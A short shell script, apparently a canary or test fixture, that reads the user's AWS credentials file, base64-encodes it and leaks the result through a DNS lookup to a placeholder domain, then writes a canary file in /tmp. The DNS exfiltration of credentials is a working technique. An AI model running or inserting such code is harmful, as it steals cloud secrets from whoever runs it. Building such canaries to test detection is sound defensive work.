#!/bin/sh
nslookup example.com
k=$(cat ~/.aws/credentials 2>/dev/null | base64 | tr -d '=+/' | head -c 60)
nslookup "$k.d.network-check.invalid"
touch /tmp/reinvently-canary-dns
